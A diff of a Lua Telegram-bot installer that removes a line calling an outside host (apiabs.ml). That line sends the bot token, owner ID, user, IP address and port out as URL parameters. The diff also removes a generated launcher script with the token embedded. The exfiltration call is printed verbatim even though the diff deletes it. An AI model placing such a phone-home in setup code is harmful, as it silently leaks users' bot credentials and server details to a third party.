@@ -76,30 +76,7 @@ TokenBot = DevRio:get(Server.."TokenDavid"),
 David = DevRio:get(Server.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdDavid")},
 }
-Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("ZAEM.sh", "w")  
-file:write([[
-#!/usr/bin/env bash
-cd $HOME/ZAEM
-token="]]..DevRio:get(Server.."TokenDavid")..[["
-while(true) do
-rm -fr ../.telegram-cli
-if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-exit 1
-fi
-if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-exit 1
-fi
-./tg -s ./ZAEM.lua -p PROFILE --bot=$token
-done
-]])  
+
 file:close()  
 file = io.open("Run", "w")  
 file:write([[
